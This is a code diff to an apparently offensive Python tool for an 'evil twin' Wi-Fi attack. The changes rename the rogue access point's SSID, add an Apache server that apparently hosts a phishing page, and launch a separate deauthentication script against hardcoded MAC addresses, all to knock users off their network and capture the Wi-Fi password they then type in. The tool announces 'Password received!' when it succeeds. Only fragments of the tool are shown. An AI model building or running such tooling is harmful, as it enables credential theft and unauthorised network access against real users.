@@ -8,8 +8,7 @@ from pyfiglet import figlet_format
 from termcolor import cprint
 import subprocess
 import shlex
-import threading
-
+import sys
 
 def count_file_chars():
     char_count = 0
@@ -33,7 +32,7 @@ def start_dnsmasq():
 
 
     while current_count == count_file_chars():
-        console.print(f'[bold][yellow].\r[/][/]')
+        console.print(f'[bold][yellow].[/][/]', end=" ")
         time.sleep(1)
 
     console.print(f'[bold][green]Password received![/][/]')
@@ -53,7 +52,7 @@ attack_inet = None
 internet_inet = None
 
 # TODO
-ssid = "FakeAP"
+ssid = "Shabab"
 
 while 1:
     user_input = main_menu_io()
@@ -73,9 +72,13 @@ while 1:
         set_inet_unmanaged(attack_inet)
         set_netmask(attack_inet)
         set_iptables(attack_inet, internet_inet)
-        set_hostapd_conf(attack_inet, ssid, 11)
+        set_hostapd_conf(attack_inet, ssid, 1)
+        set_apache_serv()
         ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
-        # deauth_th = threading.Thread(target=deauth, args=('26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan9", 1))
+
+        subprocess.Popen([sys.executable, 'attack.py', '26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan1mon", "1"], start_new_session=True)
+        
+        # deauth_th = threading.Thread(target=deauth, args=('26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan1mon", 1))
         # deauth_th.start()
         start_dnsmasq()
         """
